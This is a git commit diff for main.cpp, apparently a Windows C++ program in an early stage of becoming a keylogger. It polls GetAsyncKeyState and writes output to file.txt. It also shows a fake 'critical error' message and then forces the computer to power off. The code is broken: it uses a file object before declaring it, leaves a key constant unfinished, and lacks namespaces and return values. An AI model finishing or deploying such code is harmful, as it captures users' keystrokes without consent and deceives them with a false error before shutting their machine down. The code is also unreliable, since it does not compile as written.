0aa056e6ddbe75696d53fb8655e71bbf320ed7c5
StormZillaa <stormzilla9933@gmail.com>
2016-04-28 10:14:41 -0500

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -1,5 +1,24 @@
 #include <windows.h>
-
+#include <iostream>
+#include <fstream>
+char checks();
 int main(){
-  
+  while(true==true){
+    if(file.is_open()){
+    ofstream file;
+    file.open("file.txt");
+    file<<checks();
+    }    
+    else{
+      cout<<"A critial error has occured";
+      cout<<"Windows will now shut down.";
+      ExitWindowsEx(EWX_POWEROFF, 0);
+      return 0;
+    }
+  }
+}
+char checks(){
+  if(GetAsyncKeyState(VK_)){
+    
+  }
 }
